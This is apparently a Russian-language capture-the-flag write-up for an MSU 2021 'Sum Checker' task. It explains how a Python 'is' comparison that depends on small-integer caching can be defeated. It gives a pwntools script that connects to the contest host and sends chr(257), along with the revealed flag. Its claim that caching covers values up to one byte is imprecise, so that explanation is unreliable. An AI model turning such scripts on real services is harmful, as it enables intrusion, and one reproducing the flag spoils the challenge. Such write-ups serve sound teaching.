# Sum Checker
_Похоже, разработчик этого сервиса полагается на коммутативность для обеспечения безопасности..._

_nc sum-checker.tasks.2021.ctf.cs.msu.ru 20002_

[checker.py](checker.py)

### Solution
В файле checker.py наблюдаем сравнение пользовательского ввода (после преобразований) оператором is, чтобы получить флаг, нам нужно выполнение следующего условия:
```python
sum([ord(i) for i in our_input]) % 260 is sum([ord(i) for i in our_input[::-1]]) % 260 == False
```

Оператор is используют, чтобы удостовериться, что переменные указывают на один и тот же объект в памяти. Python указывает на один и тот же объект, если его значение не превышает один байт (2**8).
Таким образом, нам остаётся написать скрипт, который отправляет символ с кодом ∈ \[257-259].

[pwm1.py](pwn1.py)
```python
import pwn

c = pwn.connect('sum-checker.tasks.2021.ctf.cs.msu.ru', 20002)
c.recvuntil(':')
c.sendline(bytes(chr(257).encode()))
flag = c.recvuntil('}').decode()
print(flag)

`
Flag: MSKCTF{pr3d3f1n3d_c0n$t4nt$_pai8eege2a}
`